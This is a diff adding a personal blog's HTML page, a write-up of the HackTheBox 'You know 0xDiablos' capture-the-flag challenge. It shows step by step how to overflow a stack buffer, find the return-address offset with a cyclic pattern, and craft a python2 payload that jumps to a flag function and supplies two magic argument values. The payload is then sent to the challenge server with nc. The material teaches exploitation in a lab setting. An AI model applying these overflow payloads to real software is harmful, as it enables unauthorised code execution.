@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>You know 0xDiablos HackTheBox</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>You know 0xDiablos HackTheBox | Dennis Blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="You know 0xDiablos HackTheBox" />
+<meta name="author" content="Dennis" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="You know 0xDiablos challenge description I missed my flag" />
+<meta property="og:description" content="You know 0xDiablos challenge description I missed my flag" />
+<meta property="og:site_name" content="Dennis Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-03-13T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="You know 0xDiablos HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Dennis","url":"https://www.github.com/DennisFeldbusch"},"dateModified":"2023-03-13T00:00:00+00:00","datePublished":"2023-03-13T00:00:00+00:00","description":"You know 0xDiablos challenge description I missed my flag","headline":"You know 0xDiablos HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"/You-know-0xDiablos"},"url":"/You-know-0xDiablos"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>dennis@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+<!-- HTML search field -->
+<div id="search-container">
+<input type="text" id="search-input" placeholder="Type your search here...">
+<ul id="results-container"></ul>
+</div>
+
+<!-- Grab search-script.js -->
+<script src="/assets/js/search-script.js" type="text/javascript"></script>
+
+<!-- Configuration -->
+<script>
+SimpleJekyllSearch({
+  searchInput: document.getElementById('search-input'),
+  resultsContainer: document.getElementById('results-container'),
+  json: '/search.json',
+  searchResultTemplate: '<li><a href="{url}">{title}</a><br><span class="post-meta">{date}</span></li>'
+})
+</script>
+
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>You know 0xDiablos HackTheBox</h2>
+  <time datetime="2023-03-13T00:00:00+00:00" class="by-line">13 Mar 2023</time>
+  <h1 id="you-know-0xdiablos">You know 0xDiablos</h1>
+<h2 id="challenge-description">challenge description</h2>
+<blockquote>
+  <p>I missed my flag</p>
+</blockquote>
+
+<h2 id="trying-a-large-input-to-cause-an-overflow">trying a large input to cause an overflow</h2>
+
+<ul>
+  <li>by executing the binary with a large input delivers us a segmentation fault</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 <span class="nt">-c</span> <span class="s2">"print 'A' * 300 "</span> | ./vuln
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">37978 segmentation fault (core dumped)  ./vuln</code></p>
+
+<h2 id="investigating-the-error">investigating the error</h2>
+
+<ul>
+  <li>by debugging the binary with <code class="language-plaintext highlighter-rouge">gdb</code> and the same input we get the following error message: Cannot access memory at address <code class="language-plaintext highlighter-rouge">0x41414141</code></li>
+</ul>
+
+<blockquote>
+  <p>this is the part of the input which overwrites the return pointer which is restored when the <code class="language-plaintext highlighter-rouge">vuln</code> functions returns the <code class="language-plaintext highlighter-rouge">main</code> function</p>
+</blockquote>
+
+<ul>
+  <li>next we can use an unique pattern to get the exact part of the input which overflows</li>
+  <li>using this pattern: <code class="language-plaintext highlighter-rouge">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</code> results in the following error: <code class="language-plaintext highlighter-rouge">Cannot access memory at address 0x33674132</code></li>
+  <li>calculating the offset results in: <code class="language-plaintext highlighter-rouge">188</code></li>
+</ul>
+
+<blockquote>
+  <p>Note: the memory address is in little-endian</p>
+</blockquote>
+
+<h2 id="crafting-the-payload">crafting the payload</h2>
+
+<ul>
+  <li>in order to print the contents of of the flag we have to manipulate the callflow to call the <code class="language-plaintext highlighter-rouge">flag</code> function at address: <code class="language-plaintext highlighter-rouge">0x80491e2</code></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 <span class="nt">-c</span> <span class="s2">"print 'A' * 188 + '</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span> | ./vuln
+</code></pre></div></div>
+
+<p>results in:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You know who are 0xDiablos:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Hurry up and try in on server side.
+</code></pre></div></div>
+
+<p>Hurray!!! Lets test it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 <span class="nt">-c</span> <span class="s2">"print 'A' * 188 + '</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span> | nc 165.232.98.156 30180
+
+You know <span class="nb">who </span>are 0xDiablos:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</code></pre></div></div>
+
+<ul>
+  <li>no flag … let’s investigate</li>
+</ul>
+
+<h2 id="fix-callflow">fix callflow</h2>
+
+<ul>
+  <li>by checking the <code class="language-plaintext highlighter-rouge">flag</code> function we have to pass three checks in order to simulate the envionment on the server and print the flag</li>
+</ul>
+
+<ol>
+  <li>there have to be a file called <code class="language-plaintext highlighter-rouge">flag.txt</code> 
+<img src="../assets/youknow-file-existence.png" alt="file existence" /></li>
+  <li><code class="language-plaintext highlighter-rouge">$rbp+0x8</code> has to be equal to <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>
+<img src="../assets/youknow-deadbeef-check.png" alt="deadbeef check" /></li>
+  <li><code class="language-plaintext highlighter-rouge">$rbp+0xc</code> has to be equal to <code class="language-plaintext highlighter-rouge">0xc0ded00d</code>
+<img src="../assets/youknow-c0ded00d-check.png" alt="c0ded00d check" /></li>
+</ol>
+
+<ul>
+  <li>luckily we can manipulate <code class="language-plaintext highlighter-rouge">$rbp+0x8</code> and <code class="language-plaintext highlighter-rouge">$rbp+0xc</code> by extending the input:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 <span class="nt">-c</span> <span class="s2">"print 'A' * 188 + '</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">44' + '</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">de' + '</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">de</span><span class="se">\x</span><span class="s2">c0'"</span> | nc 165.232.98.156 30180
+</code></pre></div>    </div>
+  </li>
+  <li>we get the flag</li>
+</ul>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>Dennis</b>
+    </span>
+    
+    <span>© 2023</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
